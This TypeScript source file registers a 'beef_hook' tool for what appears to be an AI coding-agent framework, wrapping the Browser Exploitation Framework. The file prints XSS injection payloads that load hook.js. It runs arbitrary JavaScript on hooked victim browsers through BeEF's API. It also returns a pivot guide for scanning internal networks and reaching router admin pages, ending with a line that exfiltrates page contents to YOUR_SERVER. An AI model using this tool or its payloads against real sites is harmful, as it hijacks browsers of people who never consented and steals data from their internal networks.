export * as BeefHookTool from "./beef-hook"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "beef_hook"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description: "BeEF action: 'start' (start BeEF server), 'hook_url' (get hook.js URL), 'list_browsers' (list hooked browsers), 'exec_js' (execute JS on hooked browser), 'get_details' (browser fingerprint), 'pivot_internal' (scan internal network from browser)",
  }),
  hook_id: Schema.String.pipe(Schema.optional).annotate({ description: "Hooked browser session ID for exec_js/get_details/pivot." }),
  js_command: Schema.String.pipe(Schema.optional).annotate({ description: "JavaScript to execute on hooked browser." }),
  port: Schema.Number.pipe(Schema.optional).annotate({ description: "BeEF UI port. Default: 3000." }),
  hook_port: Schema.Number.pipe(Schema.optional).annotate({ description: "BeEF hook server port. Default: 3000." }),
  host: Schema.String.pipe(Schema.optional).annotate({ description: "BeEF host IP. Default: 0.0.0.0." }),
  api_key: Schema.String.pipe(Schema.optional).annotate({ description: "BeEF API key (from config.yaml)." }),
})

const Output = Schema.Struct({
  output: Schema.String,
  exit: Schema.Number.pipe(Schema.optional),
})

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools.register({
      [name]: Tool.make({
        description: `Browser Exploitation Framework (BeEF) integration. Start BeEF server, generate hook URLs to inject via XSS, list hooked browsers, execute arbitrary JavaScript on hooked browsers, extract browser fingerprints/network info, and pivot into internal networks from the browser context. Essential for client-side attacks after XSS.`,
        input: Input,
        output: Output,
        toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
        execute: (input) =>
          Effect.gen(function* () {
            const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"
            const port = input.port ?? 3000
            const host = input.host ?? "0.0.0.0"

            switch (input.action) {
              case "start": {
                const cmd = ChildProcess.make("beef", ["-x"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) })
                const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(20), maxOutputBytes: 512 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                return {
                  exit: result?.exitCode,
                  output: result?.output?.toString("utf8") ?? "BeEF failed to start. Install: git clone https://github.com/beefproject/beef && cd beef && bundle install",
                }
              }

              case "hook_url": {
                return {
                  output: `BeEF Hook URL:\nhttp://${host}:${port}/hook.js\n\nInject this in any XSS vulnerability:\n<script src="http://${host}:${port}/hook.js"></script>\n\nOr in an img tag:\n<img src="x" onerror="s=document.createElement('script');s.src='http://${host}:${port}/hook.js';document.body.appendChild(s)">\n\nOnce a browser loads this, it appears in the BeEF panel.`,
                }
              }

              case "list_browsers": {
                const key = input.api_key ?? "beef"
                const cmd = ChildProcess.make("curl", ["-s", "-H", `Authorization: Bearer ${key}`, `http://localhost:${port}/api/hooks`], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) })
                const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(15), maxOutputBytes: 512 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                return { exit: result?.exitCode, output: result?.output?.toString("utf8") ?? "No hooked browsers or BeEF not running." }
              }

              case "exec_js": {
                if (!input.hook_id || !input.js_command) return { output: "ERROR: 'hook_id' and 'js_command' required." }
                const key = input.api_key ?? "beef"
                const payload = JSON.stringify({ js: input.js_command })
                const cmd = ChildProcess.make("curl", ["-s", "-X", "POST", "-H", `Authorization: Bearer ${key}`, "-H", "Content-Type: application/json", "-d", payload, `http://localhost:${port}/api/hooks/${input.hook_id}/modules/1`], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) })
                const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(15), maxOutputBytes: 512 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                return { exit: result?.exitCode, output: result?.output?.toString("utf8") ?? "Execution failed." }
              }

              case "get_details": {
                if (!input.hook_id) return { output: "ERROR: 'hook_id' required." }
                const key = input.api_key ?? "beef"
                const cmd = ChildProcess.make("curl", ["-s", "-H", `Authorization: Bearer ${key}`, `http://localhost:${port}/api/hooks/${input.hook_id}`], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) })
                const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(15), maxOutputBytes: 512 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                return { exit: result?.exitCode, output: result?.output?.toString("utf8") ?? "Failed." }
              }

              case "pivot_internal": {
                return {
                  output: `Internal Network Pivot from Hooked Browser:

1. Get browser's internal IP via WebRTC:
   exec_js hook_id="${input.hook_id ?? "ID"}" js_command="new RTCPeerConnection({iceServers:[]}).createDataChannel('');new RTCPeerConnection({iceServers:[]}).createOffer(o=>o,p);"

2. Scan internal ports via fetch timing:
   exec_js: fetch('http://192.168.1.1:80').then(r=>alert('open'))

3. Access internal services (router admin, internal apps):
   exec_js: fetch('http://192.168.1.1/admin/').then(r=>r.text()).then(t=>document.title=t)

4. Exfiltrate internal page contents:
   exec_js: fetch('http://internal-app/').then(r=>r.text()).then(t=>fetch('http://YOUR_SERVER/?data='+btoa(t)))

5. Use BeEF's network module for full port scanning via REST API.`,
                }
              }

              default:
                return { output: `Unknown action: ${input.action}. Supported: start, hook_url, list_browsers, exec_js, get_details, pivot_internal` }
            }
          }).pipe(Effect.mapError(() => new ToolFailure({ message: "BeEF operation failed" }))),
      }),
    }).pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/beef-hook",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
